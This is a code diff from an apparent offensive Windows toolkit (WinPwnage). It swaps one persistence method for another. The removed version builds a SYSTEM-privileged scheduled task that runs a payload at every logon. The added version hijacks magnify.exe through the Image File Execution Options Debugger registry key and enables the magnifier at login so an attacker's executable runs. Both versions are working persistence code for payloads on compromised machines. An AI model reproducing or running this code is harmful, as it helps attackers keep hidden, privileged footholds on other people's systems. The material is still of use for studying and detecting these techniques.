@@ -1,13 +1,9 @@
-import os
-import time
-import datetime
-import tempfile
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
 persistMethod3_info = {
-	"Description": "Persistence using schtasks.exe (SYSTEM privileges)",
-	"Method": "Malicious scheduled task",
+	"Description": "Persistence using image file execution option and magnifier.exe",
+	"Method": "Image File Execution Options debugger and accessibility application",
 	"Id": "3",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
@@ -22,87 +18,30 @@ def persistMethod3(payload, name="", add=True):
 		print_error("Cannot proceed, we are not elevated")
 		return False
 
+	if "64" in information().architecture():
+		magnify_key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
+	else:
+		magnify_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
+
+	accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
+
 	if add:
 		if payloads().exe(payload):
-			xml_template = """<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-	<RegistrationInfo>
-		<Date>{date}</Date>
-		<URI>\\Microsoft\\Windows\\{name}</URI>
-	</RegistrationInfo>
-	<Triggers>
-		<LogonTrigger>
-			<Enabled>true</Enabled>
-		</LogonTrigger>
-	</Triggers>
-	<Principals>
-		<Principal id="Author">
-			<UserId>S-1-5-18</UserId>
-			<RunLevel>HighestAvailable</RunLevel>
-		</Principal>
-	</Principals>
-	<Settings>
-		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-		<AllowHardTerminate>false</AllowHardTerminate>
-		<StartWhenAvailable>true</StartWhenAvailable>
-		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-		<IdleSettings>
-			<StopOnIdleEnd>true</StopOnIdleEnd>
-			<RestartOnIdle>false</RestartOnIdle>
-		</IdleSettings>
-		<AllowStartOnDemand>true</AllowStartOnDemand>
-		<Enabled>true</Enabled>
-		<Hidden>false</Hidden>
-		<RunOnlyIfIdle>false</RunOnlyIfIdle>
-		<WakeToRun>false</WakeToRun>
-		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-		<Priority>7</Priority>
-		<RestartOnFailure>
-			<Interval>PT2H</Interval>
-			<Count>999</Count>
-		</RestartOnFailure>
-	</Settings>
-	<Actions Context="Author">
-		<Exec>
-			<Command>"{payload}"</Command>
-		</Exec>
-	</Actions>
-</Task>""".format(date=str(datetime.datetime.now()).replace(' ', 'T'), name=name, payload=payloads().exe(payload)[1])
-
-			try:
-				xml_file = open(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), "w")
-				xml_file.write(xml_template)
-				xml_file.close()
-			except Exception:
-				return False
-
-			time.sleep(5)
-
-			if os.path.isfile(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name))):
-				if process().create("schtasks.exe", params="/create /xml {path} /tn {name}".format(
-						path=os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), name=name)):
-					print_success("Successfully created scheduled task, payload will run at login")
-				else:
-					print_error("Unable to create scheduled task")
-					return False
-
-				time.sleep(5)
-
-				try:
-					os.remove(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)))
-				except Exception:
-					return False
-			else:
-				print_error("Unable to create scheduled task, xml file not found")
-				return False
+			if registry().modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=payloads().exe(payload)[1], create=True):
+				print_success("Successfully created Debugger key containing payload ({})".format(payloads().exe(payload)[1]))
+				if registry().modify_key(hkey="hklm", path=accessibility_key, name="Configuration", value="magnifierpane", create=True):
+					print_success("Successfully installed persistence, payload will run at login")
+					return True
+			print_error("Unable to install persistence")
+			return False
 		else:
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		if process().create("schtasks.exe", params="/delete /tn {name} /f".format(name=name)):
-			print_success("Successfully removed persistence")
-		else:
-			print_error("Unable to remove persistence")
-			return False
+		if registry().remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
+			if registry().remove_key(hkey="hklm", path=magnify_key, delete_key=True):
+				print_success("Successfully removed persistence")
+				return True
+
+		print_error("Unable to remove persistence")
+		return False
